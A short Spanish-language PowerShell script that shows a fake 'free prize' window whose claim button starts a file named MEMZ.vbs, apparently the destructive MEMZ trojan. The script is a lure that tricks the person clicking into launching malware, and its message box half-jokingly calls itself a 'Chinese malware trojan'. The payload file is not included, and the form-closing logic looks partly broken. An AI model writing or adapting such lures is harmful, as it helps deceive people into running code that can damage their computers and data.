Add-Type -AssemblyName System.Windows.Forms


$Form = New-Object System.Windows.Forms.Form
$Form.Text = "Chino Gratis!"
$Form.Size = New-Object System.Drawing.Size(400, 200)

# Crear un boton
$Button = New-Object System.Windows.Forms.Button
$Button.Location = New-Object System.Drawing.Point(150, 75)
$Button.Size = New-Object System.Drawing.Size(100, 30)
$Button.Text = "Reclamar chino"
$Button.Add_Click({
    
    [System.Windows.Forms.MessageBox]::Show("Haga click en aceptar para recojer el premio", "Chinese malware trojan :/")
    Start MEMZ.vbs
})


$Form.Controls.Add($Button)

$Form.ShowDialog()

$Form.Add_FormClosed({
    $Form.Dispose()
})

$Form.Add_FormClosed({
    [System.Windows.Forms.Application]::Exit()
})

# Iniciar la aplicaci�n
[System.Windows.Forms.Application]::Run($Form)
